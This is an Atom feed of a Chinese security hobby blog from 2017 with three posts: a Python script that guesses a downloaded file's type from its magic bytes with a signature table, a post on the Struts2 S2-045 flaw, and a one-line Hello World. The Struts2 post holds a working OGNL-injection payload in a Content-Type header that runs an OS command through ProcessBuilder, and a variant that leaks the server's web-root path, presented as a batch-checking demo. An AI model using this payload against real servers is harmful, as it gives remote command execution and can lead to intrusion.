<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>masker</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://phpplay.github.io/"/>
  <updated>2017-03-14T06:12:42.729Z</updated>
  <id>http://phpplay.github.io/</id>
  
  <author>
    <name>masker</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python判断网络文件类型测试脚本</title>
    <link href="http://phpplay.github.io/2017/03/14/test/"/>
    <id>http://phpplay.github.io/2017/03/14/test/</id>
    <published>2017-03-14T05:40:21.000Z</published>
    <updated>2017-03-14T06:12:42.729Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>##测试<br>    当时想起土司一个帖子，是通过文件头判断下载文件类型的思路来做一个挖掘姬，所以就想用python写一个，所以做了些测试。</p>
<p>###</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">typeList</span><span class="params">()</span>:</span>  </div><div class="line">    <span class="keyword">return</span> &#123;  <span class="string">"52617221"</span>: <span class="string">"rar"</span>,   <span class="string">"504B0304"</span>: <span class="string">"zip"</span> &#125;  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">toHex</span><span class="params">(s)</span>:</span></div><div class="line">    lst = []</div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</div><div class="line">        hv = hex(ord(ch)).replace(<span class="string">'0x'</span>, <span class="string">''</span>)</div><div class="line">        <span class="keyword">if</span> len(hv) == <span class="number">1</span>:</div><div class="line">            hv = <span class="string">'0'</span>+hv</div><div class="line">        lst.append(hv)</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y:x+y, lst)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    </div><div class="line">    response = urllib2.urlopen(<span class="string">'http://127.0.0.1:8081/test.lnk.lnk'</span>,timeout=<span class="number">5</span>)</div><div class="line">    </div><div class="line">    code = response.getcode()</div><div class="line">    <span class="keyword">print</span> code    </div><div class="line">    </div><div class="line">    <span class="comment">#print response.info()</span></div><div class="line">    </div><div class="line">    <span class="keyword">print</span>  type(response)</div><div class="line">    </div><div class="line">    html = response.read(<span class="number">3</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">print</span>  type(html)</div><div class="line"> </div><div class="line">    </div><div class="line">    <span class="keyword">print</span> html</div><div class="line">    </div><div class="line">    </div><div class="line">    </div><div class="line">    ty1 =toHex(html).upper()</div><div class="line">    <span class="keyword">print</span> ty1</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> ty1 == <span class="string">"526172"</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'rar'</span></div><div class="line">    <span class="keyword">elif</span> ty1 == <span class="string">"504B03"</span>:</div><div class="line">        <span class="keyword">print</span>  <span class="string">"zip"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"wu"</span></div><div class="line">    </div><div class="line"></div><div class="line">   <span class="comment"># print  bytes2hex(response)</span></div><div class="line">   </div><div class="line">   </div><div class="line"></div><div class="line">  </div><div class="line"><span class="keyword">except</span> urllib2.URLError,e:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"><span class="string">'''        print "Failed to reach the server"</span></div><div class="line">        #print "The reason:",e.reason</div><div class="line">    elif hasattr(e,"code"):</div><div class="line">        print "The server couldn't fulfill the request"</div><div class="line">        print "Error code:",e.code</div><div class="line">        print "Return content:",e.read()</div><div class="line">else:</div><div class="line">    pass  #其他异常的处理</div><div class="line"> </div><div class="line">'''</div><div class="line"></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">   ty=typeList()</div><div class="line">   if ty1 in ty:</div><div class="line">       print "ok"</div><div class="line">"""</div></pre></td></tr></table></figure>
<p>###其它测试数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">JPEG (jpg) FFD8FF</div><div class="line">PNG (png) 89504E47</div><div class="line">GIF (gif) 47494638</div><div class="line">TIFF (tif) 49492A00</div><div class="line">Windows Bitmap (bmp) 424D</div><div class="line">CAD (dwg) 41433130</div><div class="line">Adobe Photoshop (psd) 38425053</div><div class="line">Rich Text Format (rtf) 7B5C727466</div><div class="line">XML (xml) 3C3F786D6C</div><div class="line">HTML (html) 68746D6C3E</div><div class="line">Email [thorough only] (eml) 44656C69766572792D646174653A</div><div class="line">Outlook Express (dbx) CFAD12FEC5FD746F</div><div class="line">Outlook (pst) 2142444E</div><div class="line">MS Word/Excel (xls.or.doc) D0CF11E0</div><div class="line">MS Access (mdb) 5374616E64617264204A</div><div class="line">WordPerfect (wpd) FF575043</div><div class="line">Postscript (eps.or.ps) 252150532D41646F6265</div><div class="line">Adobe Acrobat (pdf) 255044462D312E</div><div class="line">Quicken (qdf) AC9EBD8F</div><div class="line">Windows Password (pwl) E3828596</div><div class="line">ZIP Archive (zip) 504B0304</div><div class="line">RAR Archive (rar) 52617221</div><div class="line">Wave (wav) 57415645</div><div class="line">AVI (avi) 41564920</div><div class="line">Real Audio (ram) 2E7261FD</div><div class="line">Real Media (rm) 2E524D46</div><div class="line">MPEG (mpg) 000001BA</div><div class="line">MPEG (mpg) 000001B3</div><div class="line">Quicktime (mov) 6D6F6F76</div><div class="line">Windows Media (asf) 3026B2758E66CF11</div><div class="line">MIDI (mid) 4D546864</div></pre></td></tr></table></figure></p>
<div class="owl-media owl-video owl-bilibili"><embed src="http://static.hdslb.com/miniloader.swf" flashvars="aid=247371&page=1" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" quality="high" allowfullscreen="true"></div>
<div id="aplayer0" class="aplayer" style="margin-bottom: 20px;"></div>
		<script>
			new APlayer({
				element: document.getElementById("aplayer0"),
				narrow: false,
				autoplay: false,
				showlrc: 0,
				music: {
					title: "她的睫毛",
					author: "周杰伦",
					url: "http://home.ustc.edu.cn/~mmmwhy/%d6%dc%bd%dc%c2%d7%20-%20%cb%fd%b5%c4%bd%de%c3%ab.mp3",
					pic: "http://home.ustc.edu.cn/~mmmwhy/jay.jpg",
				}
			});
		</script>
<video width="480" height="320" controls><br><source src="http://static.hdslb.com/miniloader.swf?aid=8203123&page=1"><br></video>
]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;p&gt;##测试&lt;br&gt;    当时想起土司一个帖子，是通过文件头判断下载文件类型的思路来做一个挖掘姬，所以就想用python写一个，所以做了些测试。&lt;/p&gt;
&lt;p&gt;###&lt;/p&gt;

    
    </summary>
    
    
      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>关于struts2-045漏洞的脚本编写</title>
    <link href="http://phpplay.github.io/2017/03/14/whoami/"/>
    <id>http://phpplay.github.io/2017/03/14/whoami/</id>
    <published>2017-03-14T03:58:35.000Z</published>
    <updated>2017-03-14T04:47:07.322Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>##始末<br>    struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.7日当天被放出来，所以批量检测工具也很快就被各黑阔论坛开发出来，然而这个时间段很是敏感，所以没爆什么大新闻。<br>        当时自己闲着没事也写一个检测的DEMO，还是很简单的，当时还知道了一个很溜的工具<a href="https://www.getpostman.com/" target="_blank" rel="external">postman</a>。</p>
<p>###我的DEMO<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">url=<span class="string">"http://text.com/index.action"</span></div><div class="line">req = urllib2.Request(url)</div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 11987654321').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div><div class="line">res = urllib2.urlopen(req)</div><div class="line">html = res.read()</div><div class="line"><span class="keyword">print</span> html</div><div class="line"><span class="keyword">if</span> <span class="string">"11987654321"</span> <span class="keyword">in</span> html:</div><div class="line">    <span class="keyword">print</span> url + <span class="string">"      is OK"</span></div></pre></td></tr></table></figure></p>
<p>###获取路径<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#cmd='echo '+#path).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div></pre></td></tr></table></figure></p>
<p>###getshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">自己百度吧</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;p&gt;##始末&lt;br&gt;    struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.
    
    </summary>
    
    
      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://phpplay.github.io/2017/03/14/hello-world/"/>
    <id>http://phpplay.github.io/2017/03/14/hello-world/</id>
    <published>2017-03-14T01:41:48.019Z</published>
    <updated>2017-03-14T04:53:17.294Z</updated>
    
    <content type="html"><![CDATA[<pre><code>时隔一年，又开始写blog了，这次能坚持多久？
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;时隔一年，又开始写blog了，这次能坚持多久？
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
